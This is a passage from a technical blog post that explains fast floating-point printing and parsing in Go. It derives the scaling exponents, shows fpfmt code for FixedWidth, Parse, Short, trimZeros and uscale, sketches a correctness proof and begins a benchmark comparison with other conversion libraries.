the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its 